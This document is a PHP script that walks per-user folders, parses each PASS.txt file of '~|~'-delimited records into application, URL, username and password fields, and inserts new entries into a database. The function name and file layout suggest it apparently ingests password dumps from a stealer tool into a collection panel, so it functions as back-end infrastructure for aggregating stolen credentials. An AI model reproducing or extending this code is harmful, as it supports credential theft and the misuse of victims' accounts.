<?php
include("config.php");

$userScanns = scandir($userDir);
unset($userScanns[0]);
unset($userScanns[1]);


function limePassContentToArray( $content )
{
    $tempLine = "";
    $resultArray = array();
    $resultArrayFinaly = array();
    foreach ($content as $line){
          $tempLine .= $line;
        if(strlen($line) == 0){
          array_push($resultArray,$tempLine);
          $tempLine = "";
        }
    }
    $i = 0;
    foreach ($resultArray as $fullLine){
        $lineArray[] = explode("~|~",$fullLine);
        $temp = array();
        
        foreach ($lineArray as $lines){
                $temp["name"] =trim( $lines[2]);
                $temp["application"] = trim($lines[4]);
                $temp["url"] = trim($lines[6]);
                $temp["username"] = trim($lines[8]);
                $temp["password"] = trim($lines[10]);
        }
        array_push($resultArrayFinaly,$temp);
        $temp = array();
    }
    return $resultArrayFinaly;
}



foreach($userScanns as $folder){
      $die = false;
      $content = file_get_contents($userDir.$folder."/PASS.txt");
      //Debug Only
      if(!empty( $content)){
       // $die = true; 
      }

      $content = explode("\r\n",$content);
      $resultArray = limePassContentToArray($content);
      //Debug Only
      //var_dump( $resultArray);

      foreach($resultArray as $result){
        $statement = $pdo->prepare("SELECT * FROM urls WHERE username LIKE ? AND url LIKE ?");
        $statement->execute(array($result["username"],$result["url"]));
        $user = $statement->fetch();
        if($user == false) {
            $statement = $pdo->prepare("INSERT INTO urls (name, application,url,username,password) VALUES (:name, :application,:url,:username,:password)");
            $statement->execute($result);
        }  
      }

      if($die){
          die();
      }
}
